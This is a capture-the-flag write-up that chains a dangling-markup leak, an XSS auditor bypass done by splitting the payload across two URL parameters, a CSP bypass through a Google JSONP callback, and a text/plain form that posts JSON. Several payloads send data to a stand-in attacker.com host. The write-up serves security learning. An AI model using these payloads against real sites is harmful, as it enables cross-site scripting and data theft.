# Bypasses Everywhere - writeup

## Dangling markup - leaking code source

At `https://bypasses-everywhere.ctf.insecurity-insa.fr/admin` we are being told that if this page is accessed from `http://127.0.0.1:8080` we should be able to see more interesting stuff.

On the same page there is a vulnerable parameter `picture` which leads to a dangling markup attack:
`https://bypasses-everywhere.ctf.insecurity-insa.fr/admin?picture="><img src='http://attacker.com/?p=`

By submitting this url to the "admin" we can leak the hidden content:
POST ; https://bypasses-everywhere.ctf.insecurity-insa.fr/url ; data: "url=http://127.0.0.1:8080/admin?picture="><img src='http://attacker.com/?p="

Soon enough we will get on our server the content of the `server-files/admin.py` file.

## XSS

Now we know that our goal is to POST a JSON payload to the /article endpoint.

To do this we will need an XSS, the injection we have on `https://bypasses-everywhere.ctf.insecurity-insa.fr/admin` is not sufficient because the "admin" is actually a chromium-headless browser (you can see it in the User-Agent header). So the XSS auditor is blocking the injection (at least I don't know any bypass, please tell me if I'm wrong on twitter: @HugoDelval)

Another endpoint is vulnerable to XSS the /article endpoint, its specificity is that there are 2 parameters that are vulnerables, which leads to an XSS auditor bypass:

https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script>al&unit=ert()</script>

## CSP

The previous XSS bypass would normally work BUT the website is also protected by a CSP: `script-src: www.google.com`. Which means that our payload, which could have done the POST we want to fetch the flag, won't work here. If you open the developper console on chromium at `https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script>al&unit=ert()</script>` you'll see the error.

Hopefully CSP can be bypassed (wow really? you didn't see it comming, right?). Here is a really good paper about this: `https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf`

The only URL endpoint I've found on the `www.google.com` subdomain is this one: `https://www.google.com/jsapi?callback=alert` (again if you have others I would love to know :D). Which mean that our previous XSS payload can be written as:
`https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script src=https://ww>&unit=w.google.com/jsapi?callback=alert></script>`

\o/ Hurray! XSS!

## Posting "JSON"

The last step is to post a json-like payload to the /admin endpoint. Here how I did it:

```html
<form method=post enctype=text/plain>
	<input name='{"secret":"No one will never ever access this beauty","url":"http://attacker.com/","a":"' value='"}'>
</form>
document.forms[0].submit()
```

Which will post:

```json
{
	"secret": "No one will never ever access this beauty",
	"url": "http://attacker.com/",
	"a": "="
}
```

## Wrapping it all together

To solve this challenge we need to submit this URL to the admin:

`http://127.0.0.1:8080/article?time=<form method=post enctype=text/plain><input name='{"secret":"No one will never ever access this beauty","url":"http://attacker.com/","a":"' value='"}'></form><script src=https://ww&unit=w.google.com/jsapi?callback=document.forms[0].submit></script>`

Which will:
1. Fetch the page on the local url (the chromium-headless admin is running on localhost)
2. Bypass the chrome XSS auditor (splitting the payload into 2 url parameters)
3. Bypass the CSP using `https://www.google.com/jsapi?callback=alert`
4. Post a JSON payload using the `enctype=text/plain` trick

## Thanks

Thanks for reading.

I hope this writeup is clear enough :) if not, please reach out -> twitter@HugoDelval
